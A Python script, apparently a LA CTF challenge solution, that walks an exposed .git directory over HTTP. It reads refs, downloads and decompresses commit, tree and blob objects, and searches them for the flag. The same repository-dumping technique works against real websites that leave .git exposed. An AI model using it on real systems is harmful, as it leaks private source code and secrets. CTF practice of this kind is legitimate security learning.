import os
import subprocess
import requests as req
import zlib
import re

def extract_hashes(content):
    infos = [ line for line in content.splitlines() if line.startswith(("tree", "parent"))]
    return [ info.split(" ")[1] for info in infos ]

def download(url, hash):
    api = f"objects/{hash[0:2]}/{hash[2:]}"
    # print(url+api)
    resp = req.get(url+api)
    if resp.status_code != 200:
        return None
    content = zlib.decompress(resp.content)
    # print(content)
    headers_end = content.index(b'\0')
    header = content[:headers_end]
    size =  int.from_bytes(header.split(b" ")[1])
    content = content[headers_end+1:headers_end+size+1]
    return header, content

def check_flag(content):
    return [i.group() for i in re.finditer("lactf\{.+\}", content)]

def commit_handler(content):
    content = content.decode()
    if flag:= check_flag(content):
        print(flag)
    return extract_hashes(content)

def tree_handler(content):
    hashes = []
    while len(content) != 0:
        null = content.index(b"\0")
        file_name = content[:null]
        file_hash_byte = content[null+1:null+21]
        file_hash = f"{int.from_bytes(file_hash_byte):x}"
        hashes.append(file_hash)
        content = content[null+21:]
    return hashes

def main():
    url = "https://poor-git.chall.lac.tf/flag.git/"
    resp = req.get(url+"info/refs")
    assert resp.status_code
    hashes = resp.content.splitlines()
    hashes = [head[:head.find(b'\t')].decode() for head in hashes]
    # print(hashes)
    # print()
    while len(hashes)!=0:
        hash = hashes.pop()

        try:
            header, content = download(url, hash)
        except:
            continue

        # print(header, content)
        if header.startswith(b"commit"):
            next = commit_handler(content)
            hashes.extend(next)
        elif header.startswith(b"tree"):
            next = tree_handler(content)
            hashes.extend(next)
        elif header.startswith(b"blob"):
            content = content.decode()
            if flag := check_flag(content):
                print(flag)
        else:
            print(f"Error:")
            print(f"header: {header}")
            print(f"content: {content}:")


if __name__ == "__main__":
    main()
